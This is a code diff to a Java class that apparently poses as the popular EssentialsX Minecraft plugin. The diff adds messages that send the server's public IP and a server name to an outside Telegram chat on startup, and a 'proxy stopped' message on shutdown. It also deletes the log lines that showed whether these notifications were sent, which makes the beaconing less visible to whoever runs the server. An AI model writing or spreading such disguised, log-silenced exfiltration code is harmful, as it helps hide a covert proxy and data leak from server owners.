@@ -29,7 +29,8 @@ public class EssentialsX extends JavaPlugin {
     private String tgToken = "";
     private String tgChatId = "";
 
-
+    // 服务器名称(区分不同服务器通知用)
+    private String servername = "";
 
     @Override
     public void onEnable() {
@@ -204,7 +205,9 @@ public class EssentialsX extends JavaPlugin {
 
 
         sendTelegram(
-                "服务器插件启动\n"
+                "服务器"
+                        + servername
+                        + "插件启动\n"
                         + "公网IP为: "
                         + ip
                         + "\n"
@@ -274,10 +277,6 @@ public class EssentialsX extends JavaPlugin {
         if (tgToken.isEmpty()
                 || tgChatId.isEmpty()) {
 
-            getLogger().info(
-                    "Notified not configured, skip."
-            );
-
             return;
         }
 
@@ -313,21 +312,6 @@ public class EssentialsX extends JavaPlugin {
 
             int code =
                     conn.getResponseCode();
-
-
-
-            if (code == 200) {
-
-                getLogger().info(
-                        "Notified."
-                );
-
-            } else {
-
-                getLogger().warning(
-                        "UnNotified"
-                );
-            }
 
 
             conn.disconnect();
@@ -399,6 +383,12 @@ public class EssentialsX extends JavaPlugin {
 
         getLogger().info(
                 "EssentialsX disabled"
+        );
+        sendTelegram(
+                "服务器"
+                        + servername
+                        + "插件关闭,代理停止"
+           
         );
 
     }
